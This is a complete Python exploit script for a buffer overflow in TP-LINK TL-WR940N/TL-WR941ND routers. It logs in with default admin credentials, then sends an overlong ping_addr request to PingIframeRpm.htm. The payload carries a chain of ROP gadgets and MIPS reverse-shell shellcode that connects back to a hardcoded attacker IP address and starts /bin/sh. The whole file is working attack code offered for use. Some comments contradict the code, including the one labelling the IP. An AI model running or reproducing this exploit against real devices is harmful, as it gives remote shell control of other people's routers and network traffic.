#Author Grzegorz Wypych - h0rac
# TP-LINK TL-WR940N/TL-WR941ND buffer overflow remote shell exploit

import requests
import md5
import base64
import string
import struct
import socket

password = md5.new('admin').hexdigest()
cookie = base64.b64encode('admin:'+password)

print '[+] Authorization cookie: ', cookie
print '[+] Login to generate user directory...'
#proxy = {'http':'127.0.0.1:8080'}

loginUrl = 'http://192.168.0.1/userRpm/LoginRpm.htm?Save=Save'
headers = {'cookie':'Authorization=Basic%20'+cookie.replace('=', '%3D')}
req = requests.get(loginUrl, headers=headers)
directory = ''

nop = "\x27\xE0\xFF\xFF"
nop1 = "\x27\x70\xc0\x01"

shellcode = string.join([
		"\x24\x0f\xff\xfa", # li	t7,-6
		"\x01\xe0\x78\x27", # nor	t7,t7,zero
		"\x21\xe4\xff\xfd", # addi	a0,t7,-3
		"\x21\xe5\xff\xfd", # addi	a1,t7,-3
		"\x28\x06\xff\xff", # slti	a2,zero,-1
		"\x24\x02\x10\x57", # li	v0,4183
		"\x01\x01\x01\x0c", # syscall	0x40404
		"\xaf\xa2\xff\xff", # sw	v0,-1(sp)
		"\x8f\xa4\xff\xff", # lw	a0,-1(sp)
		"\x34\x0f\xff\xfd", # li	t7,0xfffd
		"\x01\xe0\x78\x27", # nor	t7,t7,zero
		"\xaf\xaf\xff\xe0", # sw	t7,-32(sp)
		"\x3c\x0e\x1f\x90", # lui	t6,0x1f90
		"\x35\xce\x1f\x90", # ori	t6,t6,0x1f90
		"\xaf\xae\xff\xe4", # sw	t6,-28(sp)

		# Big endian IP address 172.28.128.4
                "\x3c\x0e\xc0\xA8"  # lui       t6,0x7f01
		#"\xac\x1c\x80\x04", # lui	t6,0x7f01
		"\x35\xce\x01\x64", # ori	t6,t6,0x101

		"\xaf\xae\xff\xe6", # sw	t6,-26(sp)
		"\x27\xa5\xff\xe2", # addiu	a1,sp,-30
		"\x24\x0c\xff\xef", # li	t4,-17
		"\x01\x80\x30\x27", # nor	a2,t4,zero
		"\x24\x02\x10\x4a", # li	v0,4170
		"\x01\x01\x01\x0c", # syscall	0x40404
		"\x24\x0f\xff\xfd", # li	t7,-3
		"\x01\xe0\x78\x27", # nor	t7,t7,zero
		"\x8f\xa4\xff\xff", # lw	a0,-1(sp)
		"\x01\xe0\x28\x21", # move	a1,t7
		"\x24\x02\x0f\xdf", # li	v0,4063
		"\x01\x01\x01\x0c", # syscall	0x40404
		"\x24\x10\xff\xff", # li	s0,-1
		"\x21\xef\xff\xff", # addi	t7,t7,-1
		"\x15\xf0\xff\xfa", # bne	t7,s0,68 <dup2_loop>
		"\x28\x06\xff\xff", # slti	a2,zero,-1
		"\x3c\x0f\x2f\x2f", # lui	t7,0x2f2f
		"\x35\xef\x62\x69", # ori	t7,t7,0x6269
		"\xaf\xaf\xff\xec", # sw	t7,-20(sp)
		"\x3c\x0e\x6e\x2f", # lui	t6,0x6e2f
		"\x35\xce\x73\x68", # ori	t6,t6,0x7368
		"\xaf\xae\xff\xf0", # sw	t6,-16(sp)
		"\xaf\xa0\xff\xf4", # sw	zero,-12(sp)
		"\x27\xa4\xff\xec", # addiu	a0,sp,-20
		"\xaf\xa4\xff\xf8", # sw	a0,-8(sp)
		"\xaf\xa0\xff\xfc", # sw	zero,-4(sp)
		"\x27\xa5\xff\xf8", # addiu	a1,sp,-8
		"\x24\x02\x0f\xab", # li	v0,4011
		"\x01\x01\x01\x0c"  # syscall	0x40404
            ], '')

#0x00024ec4: lw $s0, ($s1); sw $s0, ($s1); lw $ra, 0x2c($sp); lw $s1, 0x28($sp); lw $s0, 0x24($sp); jr $ra;
#We control S0 and S1 registers

#1) First gadget will set a0 to 1
libcBase= 0x77f53000
sleep = libcBase + 0x53CA0
gadget1 = libcBase + 0x00055c60 # addiu $a0, $zero, 1; move $t9, $s1; jalr $t9;
gadget2 = libcBase + 0x00024ecc #lw $ra, 0x2c($sp); lw $s1, 0x28($sp); lw $s0, 0x24($sp); jr $ra;
gadget3 = libcBase + 0x0001e20c # move $t9, $s1; lw $ra, 0x24($sp); lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $t9
gadget4 = libcBase + 0x000195f4 #addiu $s0, $sp, 0x24; move $a0, $s0; move $t9, $s1; jalr $t9; 
gadget5 = libcBase + 0x000154d8 # #move $t9, $s0; jalr $t9; 


print "[+] First gadget address: ", hex(gadget1)
print "[+] Second gadget address: ", hex(gadget2) 
print "[+] Third gadget address: ", hex(gadget3)
print "[+] Fourth gadget address: ", hex(gadget4)
print "[+] Fifth gadget address: ", hex(gadget4)
print "[+] Sleep function address: ", hex(sleep)  
payload = "A"*160
s0 = "BBBB"
s1 = gadget2
payload += s0
payload += struct.pack('>I', s1)
payload += struct.pack('>I', gadget1) #Overwrite RA address
#New stack for gadget 2 starts
payload += "E" * 20 # adjust stack
payload += "FFFF" #gadget3 -> lw $s0, 0x18($sp) => 24 bytes
payload += "GGGG" #gadget3 -> lw $s1, 0x1c($sp) => 28 bytes
payload += "HHHH" #gadget3 -> lw $s2, 0x20($sp) => 32 bytes
payload += "AAAA"
payload += "CCCC"
payload += struct.pack('>I', sleep) #gadget2 -> lw $s1, 0x28($sp) => 40 bytes
payload += struct.pack('>I', gadget3) #gadget2 -> lw $ra, 0x2c($sp) => 44 bytes
#New stack for gadget 3 starts
payload += "G" *24
payload += "A"* 4 #lw $s0, 0x18($sp); sp + 24 bytes = s0

payload += struct.pack('>I', gadget5)
#payload += "B" *4 #lw $s1, 0x1c($sp); sp + 28 bytes = s1 <= load gadget 5 addr

payload += "C" *4 #lw $s2, 0x20($sp); sp + 32 bytes = s2

#payload += "D" *4 #lw $ra, 0x24($sp); sp + 36 bytes = ra <= load gadget 4 addr
payload += struct.pack('>I', gadget4)

#New stack for gadget 4 starts
payload += nop * 32  
#payload += "A"*40
payload += shellcode #addiu $s0, $sp, 0x24; sp + 36 bytes = s0


#payload += nop1 *20
#payload += shellcode

if(req.status_code):
    directory = req.text.split('=')[2].split('/')[3]
    print '[+] Retrieved folder name: ', directory
    req.close() 
    referer ='http://192.168.0.1/{0}/userRpm/DiagnosticRpm.htm'.format(directory)
  
    host = '192.168.0.1'
    port = 80

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print "[*] Connected, sending payload {0} bytes...".format(len(payload))
    pingUrl = '{1}/userRpm/PingIframeRpm.htm'.format(host,directory)
    pingUrl += '?ping_addr='+payload+'&doType=ping&isNew=new&sendNum=4&psize=64&overTime=800&trHops=20'
    auth = 'Authorization=Basic%20'+cookie.replace('=', '%3D')
    pingReq = "GET /{0} HTTP/1.1\r\nHost: {1}\r\nReferer: {2}\r\ncookie: {3}\r\n\r\n".format(pingUrl, host, referer, auth)
    print "[+] Exploit request: {0}".format(pingReq)
    s.send(pingReq)
    s.recv(4096)
    s.close()
else:
    req.close()


 
